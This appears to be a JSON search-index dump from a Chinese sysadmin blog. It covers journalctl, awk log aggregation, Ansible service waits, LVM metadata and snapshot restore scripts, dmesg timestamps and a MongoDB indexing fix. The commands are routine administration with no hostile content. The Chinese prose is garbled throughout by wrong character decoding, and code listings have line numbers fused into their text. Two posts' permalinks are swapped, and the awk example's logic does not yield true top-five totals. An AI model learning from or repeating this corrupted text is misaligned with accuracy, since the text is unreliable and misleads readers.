æœ€ååˆ·ä¸€ä¸‹ï¼ŒæŠŠå†…å­˜çš„æ–‡ä»¶åˆ·åˆ°ç£ç›˜ä¸­\n1journalctl --flush è¿˜å¯ä»¥è®¾ç½®ä¿å­˜å¤©æ•°ï¼š\n1journalctl --vacuum-time=31d æŸ¥çœ‹æ˜¯ä»é‚£ä¸€å¤©å¼€å§‹ä¿å­˜çš„ï¼Œè¿›ç›®å½•æŸ¥çœ‹æ—¶é—´æˆ³å³å¯\n1cd /var/log/journal 2ls -lha æœ€åå°±æ˜¯ä¸€ä¸ªç§˜ç±äº†ï¼Œå¦‚æœæŠŠæ—¥å¿—å¼„å‡ºæ¥æŸ¥çœ‹\n1journalctl -u circle --since \u0026#34;2022-10-19 14:30:00\u0026#34; --until \u0026#34;2022-10-19 15:00:00\u0026#34; å¼€å‘äººå‘˜ç»å¸¸é—®æˆ‘è¦æ—¥å¿—ï¼Œè¿™æ ·å°±ç‰¹åˆ«æ–¹ä¾¿å¿«æ·äº†ï¼Œæ¯”ä»log4jçš„æ—¥å¿—ç›®å½•é‡Œæ‹‰æ–¹ä¾¿çš„å¤šã€‚\n","date":"2022-10-19","img":"","permalink":"https://rendoumi.com/posts/20220925-awk_usage/","series":null,"tags":null,"title":"Systemdä¸journalctlçš„åŒå‰‘åˆç’§"},{"categories":null,"content":"awk æ˜¯æ¯”è¾ƒå¼ºåŠ›çš„å·¥å…·ï¼Œè·Ÿcutå’Œsedç»„åˆèµ·æ¥ï¼Œä¼šæœ‰æ„æƒ³ä¸åˆ°çš„ä½œç”¨\nä¸¾ä¸ªç®€å•ä¾‹å­ï¼Œæˆ‘ä»¬nginxçš„access.logå¦‚ä¸‹ï¼š\n1110.244.232.88 - - [12/Apr/2022:16:50:06 +0800] help.jjwxc.net \u0026#34;GET /user/article/248 HTTP/1.1\u0026#34; 200 10616 \u0026#34;http://my.jjwxc.net/\u0026#34; 2220.244.232.88 - - [12/Apr/2022:16:50:06 +0800] help.jjwxc.net \u0026#34;GET /user/article/248 HTTP/1.1\u0026#34; 200 20616 \u0026#34;http://my.jjwxc.net/\u0026#34; 3330.244.232.88 - - [12/Apr/2022:16:50:06 +0800] help.jjwxc.net \u0026#34;GET /user/article/248 HTTP/1.1\u0026#34; 200 30616 \u0026#34;http://my.jjwxc.net/\u0026#34; 4410.244.232.88 - - [12/Apr/2022:16:50:06 +0800] help.jjwxc.net \u0026#34;GET /user/article/248 HTTP/1.1\u0026#34; 200 10616 \u0026#34;http://my.jjwxc.net/\u0026#34; 5530.244.232.88 - - [12/Apr/2022:16:50:06 +0800] help.jjwxc.net \u0026#34;GET /user/article/248 HTTP/1.1\u0026#34; 200 10616 \u0026#34;http://my.jjwxc.net/\u0026#34; 6650.244.232.88 - - [12/Apr/2022:16:50:06 +0800] help.jjwxc.net \u0026#34;GET /user/article/248 HTTP/1.1\u0026#34; 200 50616 \u0026#34;http://my.jjwxc.net/\u0026#34; 7760.244.232.88 - - [12/Apr/2022:16:50:06 +0800] help.jjwxc.net \u0026#34;GET /user/article/248 HTTP/1.1\u0026#34; 200 60616 \u0026#34;http://my.jjwxc.net/\u0026#34; ç¬¬ä¸€ä¸ªå­—æ®µæ˜¯ipï¼Œç„¶åå€’æ•°ç¬¬3ä¸ªæ˜¯200ï¼Œè¡¨ç¤º200 OKï¼Œåé¢çš„å°±æ˜¯ä¼ è¾“äº†å¤šå°‘æ•°æ®ä¸¤ç»™å®¢æˆ·ç«¯ æˆ‘ä»¬è¦ç»Ÿè®¡ä¸€ä¸‹æµé‡å¤§çš„å‰5åæ˜¯è°ã€‚\næ€è·¯å¦‚ä¸‹ï¼š æˆ‘ä»¬éœ€è¦é€ ä¸€ä¸ªæ•°ç»„ï¼Œç„¶åæ•°ç»„çš„é”®å€¼å°±æ˜¯ipï¼Œç„¶åå€¼å°±æ˜¯æ•°æ®é‡ï¼Œå¦‚æœipé‡å¤ï¼Œé‚£ä¹ˆå°±ç´¯åŠ æ•°æ®\n1cat access.log | awk -F\\\u0026#34; \u0026#39;{print $1 $3}\u0026#39;|cut -d\u0026#39; \u0026#39; -f 1,9|sort -nrk 2| awk \u0026#39;{ip[$1] +=$2}END{for (i in ip) {print i, ip[i]}}\u0026#39; | sed -n \u0026#39;1,5p\u0026#39; æœ€åç»“æœï¼š\n1160.244.232.88 60616 2220.244.232.88 20616 3330.244.232.88 41232 4450.244.232.88 50616 5510.244.232.88 21232 æ³¨æ„ 10.244.232.88 å’Œ 30.244.232.88 åé¢çš„æ•°æ®éƒ½æ˜¯ç´¯åŠ è¿‡çš„ã€‚\n","date":"2022-09-25","img":"","permalink":"https://rendoumi.com/posts/20221019-systemctl/","series":null,"tags":null,"title":"Awkçš„ç”¨æ³•"},{"categories":null,"content":"ansibleçš„è„šæœ¬ä¸­æˆ‘ä»¬å¯èƒ½ä¼šè¦å¯åŠ¨æŸé¡¹æœåŠ¡å¹¶ç­‰å¾…ï¼Œç›´åˆ°æœåŠ¡å¯åŠ¨èµ·æ¥ï¼Œç„¶åå†è¿›è¡Œä¸‹ä¸€æ­¥\nè¿™ä¸ªéå¸¸é‡è¦ï¼Œæˆ‘ä»¬ä¸¾ä¾‹æ¥å®éªŒä¸€ä¸‹ï¼š\n1- hosts: localhost 2 vars: 3 local__service: ssh 4 tasks: 5 - block: 6 - name: \u0026#34;Stop {{ local__service }} service\u0026#34; 7 systemd: 8 service: \u0026#34;{{ local__service }}\u0026#34; 9 state: stopped 10 11 - name: \u0026#34;Populate ansible_facts.services variable\u0026#34; 12 ansible.builtin.service_facts: 13 14 - name: \u0026#34;{{ local__service }} state will be stopped as expected\u0026#34; 15 assert: 16 that: 17 ansible_facts.services[local__service].state == \u0026#39;stopped\u0026#39; 18 19 - name: \u0026#34;Start {{ local__service }} service\u0026#34; 20 systemd: 21 service: \u0026#34;{{ local__service }}\u0026#34; 22 state: started 23 24 - name: \u0026#34;Registered {{ local__service }} state will still be stopped as it was not refreshed\u0026#34; 25 assert: 26 that: 27 ansible_facts.services[local__service].state == \u0026#39;stopped\u0026#39; 28 29 - name: \u0026#34;Refresh ansible_facts.services variable\u0026#34; 30 ansible.builtin.service_facts: 31 32 - name: \u0026#34;{{ local__service }} state will be running as expected\u0026#34; 33 assert: 34 that: 35 ansible_facts.services[local__service].state == \u0026#39;running\u0026#39; ä¸Šé¢çš„ playbook ä¸€å…±æœ‰7æ­¥ï¼š\n1ã€åœæ­¢ ssh æœåŠ¡\n2ã€è·å– ansible_fact å˜é‡\n3ã€æ–­è¨€ ansible_facts ä¸­çš„ ssh æœåŠ¡æ˜¯ stopped çŠ¶æ€\n4ã€é‡æ–°å¯åŠ¨ ssh æœåŠ¡\n5ã€æ–­è¨€ ansible_facts ä¸­çš„ ssh æœåŠ¡ä»ç„¶æ˜¯ stopped çŠ¶æ€\n6ã€é‡æ–°è·å– ansible_fact å˜é‡\n7ã€è¿™æ—¶ ansible_facts ä¸­çš„ ssh æœåŠ¡çŠ¶æ€åˆ·æ–°äº†ï¼Œå˜æˆäº† running\nå°±æ˜¯æœåŠ¡å¯åŠ¨åï¼Œå¿…é¡»å»ä¸æ–­åˆ·æ–° ansible_factsï¼Œæ‰èƒ½è·å¾—åˆ·æ–°åçš„çŠ¶æ€ï¼Œæ‰€ä»¥æˆ‘ä»¬åˆ©ç”¨è¿™ä¸€ç‚¹ï¼Œè„šæœ¬å¦‚ä¸‹ï¼š\n1- hosts: localhost 2 vars: 3 local__service: ssh 4 tasks: 5 - block: 6 - name: \u0026#34;Stop {{ local__service }} service\u0026#34; 7 systemd: 8 service: \u0026#34;{{ local__service }}\u0026#34; 9 state: stopped 10 11 - name: \u0026#34;Wait until {{ local__service }} service is stopped\u0026#34; 12 ansible.builtin.service_facts: 13 register: temp__service_facts 14 until: temp__service_facts.ansible_facts.services[local__service].state == \u0026#39;stopped\u0026#39; 15 retries: 20 16 delay: 2 17 18 - name: \u0026#34;Start {{ local__service }} service\u0026#34; 19 systemd: 20 service: \u0026#34;{{ local__service }}\u0026#34; 21 state: started 22 23 - name: \u0026#34;Wait until {{ local__service }} service is running\u0026#34; 24 ansible.builtin.service_facts: 25 register: temp__service_facts 26 until: temp__service_facts.ansible_facts.services[local__service].state == \u0026#39;running\u0026#39; 27 retries: 20 28 delay: 2 ä¸Šé¢wait untilçš„æ­¥éª¤å°±æ˜¯ï¼Œæ³¨å†Œä¸€ä¸ªä¸´æ—¶çš„å˜é‡ï¼Œç„¶åä¸æ–­å»æµ‹è¯•ï¼Œé‡è¯•20æ¬¡ï¼Œæ¯æ¬¡çš„å»¶æ—¶æ˜¯2ç§’ã€‚è¿™æ ·å°±å¯ä»¥è§£å†³äº†ã€‚\n","date":"2022-07-29","img":"","permalink":"https://rendoumi.com/posts/20220729-ansible_until/","series":null,"tags":null,"title":"Ansibleä¹‹ç­‰å¾…æœåŠ¡çŠ¶æ€å˜æˆæˆåŠŸ"},{"categories":null,"content":"åœ¨ç”Ÿäº§ç³»ç»Ÿä¸­ä½¿ç”¨LVMåŠ¡å¿…è¦æ³¨æ„lvm metadataçš„å¤‡ä»½ï¼Œæ›¾ç»åœ¨äº¬ä¸œçš„æ—¶å€™å‘ç”Ÿè¿‡è™šæœºç”¨äº†lvmçš„ç£ç›˜ç³»ç»Ÿï¼Œç„¶åè™šæœºæ–‡ä»¶qcow2çªç„¶åæ‰äº†ï¼Œæƒ³å°½äº†åŠæ³•ä¹Ÿæ— æ³•æ¢å¤ï¼Œè¿™ç»™æˆ‘ä»¬æ‹‰å“äº†è­¦é’Ÿå•Šï¼Œä½¿ç”¨lvmçš„æ—¶å€™åŠ¡å¿…è¦å¤‡ä»½åˆ†åŒºä¿¡æ¯ï¼Œå¦åˆ™åçš„æ—¶å€™å°±æ¬²å“­æ— æ³ªäº†ã€‚\nç¼ºçœåœ¨ /etc/lvm/backup/ ç›®å½•ä¸‹æ˜¯æœ€æ–°çš„å¤‡ä»½ï¼ŒåŒæ ·å†å²ç‰ˆæœ¬éƒ½åœ¨ /etc/lvm/archive/ ç›®å½•ä¸‹ã€‚\nä¸€ã€å…ˆå¤‡ä»½ åœ¨å¼€å§‹æ¢å¤ä¹‹å‰ï¼Œä¸€å®šå…ˆåšä¸ªå¤‡ä»½\n1cp -pr /etc/lvm /etc/lvm_bkp ç„¶åå»çœ‹çœ‹archiveä¸‹çš„å¤‡ä»½ä¿¡æ¯\n1ls -l /etc/lvm/archive/vg_storage_00* 2-rw-------. 1 root root 13722 Oct 28 23:45 /etc/lvm/archive/vg_storage_00419-1760023262.vg 3-rw-------. 1 root root 14571 Oct 28 23:52 /etc/lvm/archive/vg_storage_00420-94024216.vg 4... 5-rw-------. 1 root root 14749 Nov 23 15:11 /etc/lvm/archive/vg_storage_00676-394223172.vg 6-rw-------. 1 root root 14733 Nov 23 15:29 /etc/lvm/archive/vg_storage_00677-187019982.vg 7# äºŒã€æœ€åçš„æƒ…å½¢æ¢å¤pv è­¦å‘Šï¼šè¿™ä¸€æ­¥åªèƒ½åœ¨VGæ— æ³•æ­£å¸¸è¿è¡Œçš„æ—¶å€™å†è¿è¡Œï¼ï¼ï¼\nå…ˆè¯´æœ€åçš„æƒ…å½¢ï¼ŒLVMçš„å»ºç«‹è·¯å¾„æ˜¯ pv \u0026mdash;\u0026gt; vg \u0026mdash;\u0026gt; lvï¼Œå‡è®¾è¿ pvï¼ˆç‰©ç†å·éƒ½æ²¡äº†ï¼‰\næˆ‘ä»¬é€‰æ‹©æœ€è¿‘çš„å¤‡ä»½ï¼Œ/etc/lvm/archive/vg_storage_00677-187019982.vg\n1less /etc/lvm/archive/vg_storage_00677-187019982.vg 2... 3 physical_volumes { 4 pv0 { 5 id = \u0026#34;BgR0KJ-JClh-T2gS-k6yK-9RGn-B8Ls-LYPQP0\u0026#34; 6... ä»é‡Œé¢æ‹¿åˆ° pv çš„ id ï¼Œé‡å»º pv\n1pvcreate --uuid \u0026#34;BgR0KJ-JClh-T2gS-k6yK-9RGn-B8Ls-LYPQP0\u0026#34; \\ 2 --restorefile /etc/lvm/archive/vg_storage_00677-187019982.vg ä¸‰ã€æ¢å¤VG å¦‚æœ vg æ˜¯æ­£å¸¸çš„ï¼Œé‚£ä¹ˆå°±ä¸ç”¨åšç¬¬äºŒæ­¥äº†ï¼Œç›´æ¥ä»å¤‡ä»½ä¸­æ¢å¤å³å¯ï¼Œå…ˆæŸ¥çœ‹ä¸€ä¸‹\n1vgcfgrestore --list vg1 2 3File: /etc/lvm/archive/vg1_00000-1238318622.vg 4VG name: vg1 5Description: Created *before* executing \u0026#39;vgcreate vg1 /dev/sda6\u0026#39; 6Backup Time: Mon Feb 29 10:58:51 2016 7 8File: /etc/lvm/archive/vg1_00001-285796155.vg 9VG name: vg1 10Description: Created *before* executing \u0026#39;lvcreate -L 1G -n lv2 vg1\u0026#39; 11Backup Time: Mon Feb 29 10:59:23 2016 12 13File: /etc/lvm/archive/vg1_00002-1661997476.vg ---\u0026gt; just before removal of volume (this is the archive we need) 14VG name: vg1 15Description: Created *before* executing \u0026#39;lvremove /dev/vg1/lv2\u0026#39; 16Backup Time: Mon Feb 29 13:55:08 2016 17 18File: /etc/lvm/backup/vg1 19VG name: vg1 20Description: Created *after* executing \u0026#39;lvremove /dev/vg1/lv2\u0026#39; 21Backup Time: Mon Feb 29 13:55:08 2016 æœ‰ä¿¡æ¯ï¼Œæˆ‘ä»¬å…ˆåŠ  \u0026ndash;test æµ‹è¯•ä¸€ä¸‹\n1vgcfgrestore vg01 --test -f /etc/lvm/archive/vg_data_00003-586203914.vg 2 3 TEST MODE: Metadata will NOT be updated and volumes will not be (de)activated. 4 Volume group vg01 has active volume: lv001. 5 WARNING: Found 1 active volume(s) in volume group \u0026#34;vg01\u0026#34;. 6 Restoring VG with active LVs, may cause mismatch with its metadata. 7 Do you really want to proceed with restore of volume group \u0026#34;vg01\u0026#34;, while 1 volume(s) are active? [y/n]: y 8 Restored volume group vg01. æ²¡é—®é¢˜ï¼Œé‚£å°±ç»§ç»­ï¼ŒçœŸçš„æ“ä½œäº†\n1vgcfgrestore vg01 -f /etc/lvm/archive/vg_data_00003-586203914.vg 2 3 Volume group vg01 has active volume: lv001. 4 WARNING: Found 1 active volume(s) in volume group \u0026#34;vg01\u0026#34;. 5 Restoring VG with active LVs, may cause mismatch with its metadata. 6 Do you really want to proceed with restore of volume group \u0026#34;vg01\u0026#34;, while 1 volume(s) are active? [y/n]: y 7 Restored volume group vg01. å››ã€æ¢å¤åè¿›è¡Œæ ¡éªŒ 1# æ˜¾ç¤ºä¿¡æ¯ 2vgdisplay VG1 3 4# æ¿€æ´» 5vgchange -ay VG1 6 7# æ˜¾ç¤ºé€»è¾‘å· 8lvs -a -o +devices 9 10# é‡æ–°æ‰«æ 11lvscan 12inactive \u0026#39;/dev/vg1/lv2\u0026#39; [1.00 GiB] inherit ### its in inactive state and make it active to use. 13ACTIVE \u0026#39;/dev/vg0/lv1\u0026#39; [1.00 GiB] inherit 14 15# ä¸Šé¢å¦‚æœæœ‰inactiveçš„ï¼Œé‡æ–°æ¿€æ´» 16lvchange -a y /dev/vg1/lv2 17 18# å†æ˜¾ç¤ºä¸€æ¬¡ 19lvs -a -o +devices 20 21# å†æ‰«æ 22lvscan 23ACTIVE \u0026#39;/dev/vg1/lv2\u0026#39; [1.00 GiB] inherit 24ACTIVE \u0026#39;/dev/vg0/lv1\u0026#39; [1.00 GiB] inherit 25 26# mountä¸Šæµ‹è¯• 27mount /dev/vg1/lv2 /lv2 28 29# çœ‹çœ‹ä¸œè¥¿éƒ½åœ¨ä¸åœ¨ 30ls -lh /lv2 äº”ã€å¤‡ä»½å’Œæ¢å¤çš„è„šæœ¬ å¤‡ä»½ä¸€ä¸ª VG ä¸‹æ‰€æœ‰å·ï¼Œæ¯ä¸ªå·ä¸€ä¸ª snapshot å¿«ç…§å¤‡ä»½æ–‡ä»¶ï¼Œbackup_snapshot_lvm.pl\n1#!/usr/bin/perl -w 2# 3# Run through a particular LVM volume group and perform a snapshot 4# and compressed file backup of each volume. 5# 6# This script is intended for use with backing up complete system 7# images of VMs, in addition to data level backups. 8# 9 10my $source_lvm_volgroup = \u0026#39;vg_storage\u0026#39;; 11my $source_lvm_snapsize = \u0026#39;5G\u0026#39;; 12my @source_lvm_excludes = (\u0026#39;lv_unwanted\u0026#39;, \u0026#39;lv_tmpfiles\u0026#39;); 13 14my $dest_dir=\u0026#39;/mnt/backup/snapshots\u0026#39;; 15 16foreach $volume (glob(\u0026#34;/dev/$source_lvm_volgroup/*\u0026#34;)) 17{ 18 $volume =~ /\\/dev\\/$source_lvm_volgroup\\/(\\S*)$/; 19 my $volume_short = $1; 20 21 if (\u0026#34;$volume_short\u0026#34; ~~ @source_lvm_excludes) 22 { 23 # Excluded volume, we skip it 24 print \u0026#34;[info] Skipping excluded volume $volume_short ($volume)\\n\u0026#34;; 25 next; 26 } 27 28 print \u0026#34;[info] Processing volume $volume_short ($volume)\\n\u0026#34;; 29 30 # Snapshot volume 31 print \u0026#34;[info] Creating snapshot...\\n\u0026#34;; 32 system(\u0026#34;lvcreate -n ${volume_short}_snapshot --snapshot $volume -L $source_lvm_snapsize\u0026#34;); 33 34 # Write compressed backup file from snapshot, but only replace existing one once finished 35 print \u0026#34;[info] Creating compressed snapshot file...\\n\u0026#34;; 36 system(\u0026#34;dd if=${volume}_snapshot | gzip --fast \u0026gt; $dest_dir/$volume_short.temp.gz\u0026#34;); 37 system(\u0026#34;mv $dest_dir/$volume_short.temp.gz $dest_dir/$volume_short.gz\u0026#34;); 38 39 # Delete snapshot 40 print \u0026#34;[info] Removing snapshot...\\n\u0026#34;; 41 system(\u0026#34;lvremove --force ${volume}_snapshot\u0026#34;); 42 43 print \u0026#34;[info] Volume $volume_short backup completed.\\n\u0026#34;; 44} 45 46print \u0026#34;[info] FINISHED! VolumeGroup backup completed\\n\u0026#34;; 47 48exit 0; æ¢å¤çš„è„šæœ¬ï¼Œrestore_snapshot_lvm.plï¼š\n1#!/usr/bin/perl -w 2# 3# Runs through LVM snapshots taken by backup_snapshot_lvm.pl and 4# restores them to the LVM volume in question. 5# 6 7my $dest_lvm_volgroup = \u0026#39;vg_storage\u0026#39;; 8my $source_dir = \u0026#39;/mnt/backup/snapshots\u0026#39;; 9 10print \u0026#34;[WARNING] Beginning restore process in 5 SECONDS!!\\n\u0026#34;; 11sleep(5); 12 13foreach $volume (glob(\u0026#34;$source_dir/*\u0026#34;)) 14{ 15 $volume =~ /$source_dir\\/(\\S*).gz$/; 16 my $volume_short = $1; 17 18 print \u0026#34;[info] Processing volume $volume_short ($volume)\\n\u0026#34;; 19 20 # Just need to decompress \u0026amp; write into LVM volume 21 system(\u0026#34;zcat $source_dir/$volume_short.gz \u0026gt; /dev/$dest_lvm_volgroup/$volume_short\u0026#34;); 22 23 print \u0026#34;[info] Volume $volume_short restore completed.\\n\u0026#34;; 24} 25 26print \u0026#34;[info] FINISHED! VolumeGroup restore completed\\n\u0026#34;; 27 28exit 0; å½“ç„¶è¦è°¨è®°ï¼Œè¿™ä¸ªæ˜¯å—è®¾å¤‡çº§åˆ«çš„å¤‡ä»½ï¼Œæœ€å¥½è¿˜æ˜¯è¦æœ‰å¦å¤–çš„æ•°æ®çš„å¤‡ä»½ã€‚\n","date":"2022-07-28","img":"","permalink":"https://rendoumi.com/posts/20220728-lvm_restore/","series":null,"tags":null,"title":"LVMç³»ç»Ÿçš„Restore"},{"categories":null,"content":"ç°åœ¨ç‰ˆæœ¬çš„ dmesg -T éƒ½æ˜¯å¸¦æ—¶é—´æˆ³çš„ã€‚\nä½†æ˜¯è€çš„æœºå™¨ï¼Œå¾ˆæœ‰å¯èƒ½æ˜¯æ²¡æœ‰ -T è¿™ä¸ªå‚æ•°çš„ï¼Œç›´æ¥ dmesg æ˜¯è¿™æ ·çš„ï¼š\nè¿™ä¸ªæ—¶é—´æˆ³æ˜¯å¤©ä¹¦å•Šï¼Œè¿™è¿˜ç®—å¥½çš„ï¼Œå¥½æ­¹æœ‰ã€‚è¿˜æœ‰æ›´å·®çš„ï¼Œè¿æˆ³å­éƒ½æ²¡æœ‰ï¼š\næˆ³å­éƒ½æ²¡æœ‰çš„ï¼Œéœ€è¦åšä»¥ä¸‹æ­¥éª¤æ¥åŠ ä¸Šï¼Œæœºå™¨é‡å¯åå¿…é¡»å†æ‰§è¡Œä¸€éï¼š\n1echo 1 \u0026gt; /sys/module/printk/parameters/printk_time åŒæ—¶å†™ä¸ªè„šæœ¬ï¼Œ/usr/local/bin/dmesgt.sh\n1#!/bin/bash 2# Translate dmesg timestamps to human readable format 3 4# desired date format 5date_format=\u0026#34;%a %b %d %T %Y\u0026#34; 6 7# uptime in seconds 8uptime=$(cut -d \u0026#34; \u0026#34; -f 1 /proc/uptime) 9 10# run only if timestamps are enabled 11if [ \u0026#34;Y\u0026#34; = \u0026#34;$(cat /sys/module/printk/parameters/time)\u0026#34; ]; then 12 dmesg | sed \u0026#34;s/^\\[[ ]*\\?\\([0-9.]*\\)\\] \\(.*\\)/\\\\1 \\\\2/\u0026#34; | while read timestamp message; do 13 printf \u0026#34;[%s] %s\\n\u0026#34; \u0026#34;$(date --date \u0026#34;now - $uptime seconds + $timestamp seconds\u0026#34; +\u0026#34;${date_format}\u0026#34;)\u0026#34; \u0026#34;$message\u0026#34; 14 done 15else 16 echo \u0026#34;Timestamps are disabled (/sys/module/printk/parameters/time)\u0026#34; 17fi è¿™æ ·å°±å¯ä»¥äº†ï¼Œæœ€åæˆ‘ä»¬æµ‹è¯•ä¸€ä¸‹ï¼š\n1echo \u0026#34;Enabled timestamps\u0026#34; | tee /dev/kmsg çœ‹åˆ°å¸¦æ—¶é—´æˆ³çš„ä¿¡æ¯å°±å¯ä»¥äº†ï¼š\n1$ dmesg 2[...] 3Bluetooth: RFCOMM TTY layer initialized 4Bluetooth: RFCOMM socket layer initialized 5Bluetooth: RFCOMM ver 1.11 6[...] 7[271309.434405] Enabled timestamps 8[...] ","date":"2022-07-25","img":"","permalink":"https://rendoumi.com/posts/20220725-dmesg_time/","series":null,"tags":null,"title":"Dmesg -T æ— æ—¶é—´æˆ³çš„è§£å†³æ–¹æ³•"},{"categories":null,"content":"æ¥åˆ°åŒäº‹çš„é€šçŸ¥ï¼Œè¯´mongodbçš„cpuå¾ˆé«˜ï¼Œä¸‹ä¸å»ï¼Œçœ‹æœ‰ä»€ä¹ˆåŠæ³•ã€‚\nçœ‹äº†ä¸€ä¸‹å›¾ï¼Œcpuéƒ½99.4%äº†ï¼Œç¡®å®å¾ˆé«˜ï¼š\nç™»ä¸Šæœºå™¨ï¼Œé¦–å…ˆå»çœ‹mongodçš„logï¼Œéƒ½è¯•å¦‚ä¸‹çš„æŸ¥è¯¢ï¼Œéƒ½å¾ˆæ…¢ï¼š\ncopyå‡ºä¸€æ¡æ¥ï¼Œå¤‡ç”¨\n12022-07-17T21:30:42.556+0800 I COMMAND [conn196670] command beyou.behaviorAnalysis command: find { find: \u0026#34;behaviorAnalysis\u0026#34;, filter: { behavior: { $regex: \u0026#34;.*äº’åŠ¨æ“ä½œ.*\u0026#34;, $options: \u0026#34;i\u0026#34; }, log: { $regex: \u0026#34;.*\\Qè§‚çœ‹ï¼šã€Šç½—é©¬çš„æˆ¿å­ã€‹,\\E.*\u0026#34;, $options: \u0026#34;i\u0026#34; }, userId: 7345, _class: { $in: [ \u0026#34;com.linkyee.api.domain.po.BehaviorAnalysis\u0026#34; ] } }, $db: \u0026#34;beyou\u0026#34; } planSummary: IXSCAN { _class: 1, behavior: 1, log: 1, userId: 1 } keysExamined:111564 docsExamined:2 cursorExhausted:1 numYields:890 nreturned:2 reslen:571 locks:{ Global: { acquireCount: { r: 891 } }, Database: { acquireCount: { r: 891 } }, Collection: { acquireCount: { r: 891 } } } storage:{} protocol:op_msg 2268ms å‘ç°ç¡®å®å¾ˆæ…¢å•Šï¼Œop_msg å±…ç„¶è¦2268msï¼Œä½†æ˜¯mongodbçš„æ•°æ®ç›®å½•æ€»å…±æ‰6Gå¤šï¼Œä¸å®¢è§‚å•Šã€‚\nçœ‹çœ‹è¡¨ç»“æ„å’Œç´¢å¼•ï¼š\n1\u0026gt; show dbs; 2admin 0.000GB 3beyou 0.063GB 4config 0.000GB 5local 0.000GB 6 7\u0026gt; use beyou; 8switched to db beyou 9 10\u0026gt; show collections; 11activityLog 12behaviorAnalysis 13 14\u0026gt; db.behaviorAnalysis.find({},{_id:0}).limit(1); 15{ \u0026#34;name\u0026#34; : \u0026#34;812304163055734784\u0026#34;, \u0026#34;createTime\u0026#34; : ISODate(\u0026#34;2022-02-19T12:46:44.360Z\u0026#34;), \u0026#34;behavior\u0026#34; : \u0026#34;äº’åŠ¨æ“ä½œ\u0026#34;, \u0026#34;log\u0026#34; : \u0026#34;åŠ å…¥çœ‹å•ï¼šã€Šçˆ±çš„è¿«é™ã€‹\u0026#34;, \u0026#34;userId\u0026#34; : 2, \u0026#34;_class\u0026#34; : \u0026#34;com.linkyee.api.domain.po.BehaviorAnalysis\u0026#34; } 16 17\u0026gt; db.behaviorAnalysis.getIndexes(); 18[ 19 { 20 \u0026#34;v\u0026#34; : 2, 21 \u0026#34;key\u0026#34; : { 22 \u0026#34;_id\u0026#34; : 1 23 }, 24 \u0026#34;name\u0026#34; : \u0026#34;_id_\u0026#34;, 25 \u0026#34;ns\u0026#34; : \u0026#34;beyou.behaviorAnalysis\u0026#34; 26 }, 27 { 28 \u0026#34;v\u0026#34; : 2, 29 \u0026#34;key\u0026#34; : { 30 \u0026#34;_class\u0026#34; : 1, 31 \u0026#34;behavior\u0026#34; : 1, 32 \u0026#34;log\u0026#34; : 1, 33 \u0026#34;userId\u0026#34; : 1 34 }, 35 \u0026#34;name\u0026#34; : \u0026#34;_class_1_behavior_1_log_1_userId_1\u0026#34;, 36 \u0026#34;ns\u0026#34; : \u0026#34;beyou.behaviorAnalysis\u0026#34; 37 } 38] å‘ç°è¡¨ç»“æ„ä¸å¤æ‚ï¼Œç´¢å¼•å‘¢æœ‰ä¸¤ä¸ªï¼Œä¸€ä¸ªç¼ºçœçš„å•å­—æ®µç´¢å¼•_idï¼Œå¦ä¸€ä¸ªæ˜¯å¤šå­—æ®µç´¢å¼•ï¼Œ4åˆä¸€çš„ï¼ˆ _classã€behaviorã€logã€userId ï¼‰\nç»§ç»­ï¼Œæ¥çœ‹çœ‹æŸ¥è¯¢ï¼š\n1find { 2 find: \u0026#34;behaviorAnalysis\u0026#34;, 3 filter: { 4 behavior: { $regex: \u0026#34;.*äº’åŠ¨æ“ä½œ.*\u0026#34;, $options: \u0026#34;i\u0026#34; }, 5 log: { $regex: \u0026#34;.*\\Qè§‚çœ‹ï¼šã€Šç½—é©¬çš„æˆ¿å­ã€‹,\\E.*\u0026#34;, $options: \u0026#34;i\u0026#34; }, 6 userId: 7345, 7 _class: { $in: [ \u0026#34;com.linkyee.api.domain.po.BehaviorAnalysis\u0026#34; ] } 8 }, 9 $db: \u0026#34;beyou\u0026#34; } 10 planSummary: IXSCAN { _class: 1, behavior: 1, log: 1, userId: 1 } keysExamined:111564 planSummaryé‡Œï¼ŒIXSCANæ˜¯æŸ¥äº†ç´¢å¼•ï¼Œä½†æ˜¯keyExaminedå±…ç„¶æœ‰111564ä¸ªï¼Œå¤ªå¤šäº†å§ã€‚\nå†çœ‹çœ‹ç´¢å¼•ï¼Œæ˜æ˜¾4åˆä¸€çš„æ•ˆç‡æœ‰é—®é¢˜ã€‚\né‚£å°±ç®€å•äº†ï¼Œåˆ æ‰è¿™ä¸ª4åˆä¸€çš„ç´¢å¼•ï¼Œæ–°å»ºä¸€ä¸ªuserIdçš„ç´¢å¼•ï¼Œæ—¢ç„¶å«userIdï¼Œé‚£æ¨æµ‹å®ƒæ˜¯å”¯ä¸€çš„ï¼Œé‡å»ºç´¢å¼•éœ€è¦åå°æ‰§è¡Œï¼Œå¹¶ä¸”åœ¨ä¸šåŠ¡ä¸ç¹å¿™çš„æ—¶å€™å†è·‘\n1db.behaviorAnalysis.createIndex({\u0026#34;userId\u0026#34;:1},{\u0026#34;name\u0026#34;:\u0026#39;idx_userId\u0026#39;,background:true,unique:true}); åŒäº‹æ‰§è¡Œçš„æ—¶å€™æŠ¥é”™ï¼š\nå±…ç„¶keyé‡å¤äº†ï¼Œé‚£å°±æŠŠ unique:true å»æ‰äº†å†æ‰§è¡Œï¼Œå°±æˆåŠŸäº†ã€‚\nç„¶åcpuå°±ç«‹ç«¿è§å½±ï¼Œä»100%é™ä½åˆ°äº†2.8%\noverï¼Œå¦‚æœå†é‡åˆ°ç“¶é¢ˆï¼Œä¼°è®¡å°±åªèƒ½é‡‡ç”¨åˆ†ç‰‡å¤§æ³•äº†ã€‚\n","date":"2022-07-21","img":"","permalink":"https://rendoumi.com/posts/20220721-mongodb_cpu/","series":null,"tags":null,"title":"ä¸€æ¬¡mongodb Cpuå¾ˆhighçš„è§£å†³æ–¹æ³•"},{"categories":null,"content":"å…ˆæ™®åŠä¸€ä¸‹æ¦‚å¿µï¼ŒInfrastructure as Codeï¼Œä¹Ÿå°±æ˜¯ä»ä»£ç å¼€å§‹å®šä¹‰æ•´ä¸ªç½‘ç»œç¯å¢ƒã€è™šæœºã€å„ç§èµ„æºç­‰ç­‰ã€‚\nç®€å•è¯´å°±æ˜¯åœ¨äº‘ä¸Šç”¨ä»£ç æ¥ç®¡ç†ä¸€åˆ‡ï¼Œæ— è®ºæ˜¯vpcã€subnetworkã€lbã€snatã€sgã€ec2\u0026hellip;\u0026hellip;\néå¸¸ç¬¦åˆæˆ‘çš„èƒƒå£ï¼Œå› ä¸ºå°±è¿æ¶æ„å›¾ï¼Œéƒ½æ˜¯ç”¨ graphviz 